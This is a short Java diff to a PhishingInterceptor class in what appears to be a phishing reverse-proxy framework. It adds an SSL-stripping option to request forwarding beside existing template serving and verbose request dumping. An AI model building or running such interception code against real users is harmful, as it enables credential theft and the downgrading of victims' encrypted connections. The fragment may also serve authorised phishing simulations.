@@ -31,7 +31,7 @@ public class PhishingInterceptor implements Interceptor {
                 .orElseThrow(() -> new IllegalStateException("Current session not set"))
                 .getConfig();
 
-        if (config instanceof PhishingSessionConfig(String domain, String template, boolean verbose)) {
+        if (config instanceof PhishingSessionConfig(String domain, String template, boolean sslStripping, boolean verbose)) {
             log.debug("Intercepting request to host {} for domain {}", host, domain);
             if (host != null && domain != null && host.matches(domain)) {
                 var path = Path.of(template);
@@ -43,7 +43,7 @@ public class PhishingInterceptor implements Interceptor {
                             }
                         });
             } else {
-                return this.reverseProxyService.forwardRequest(request)
+                return this.reverseProxyService.forwardRequest(request, sslStripping)
                         .doOnNext(response -> {
                             if (verbose) {
                                 this.dataDumpService.dump(request);
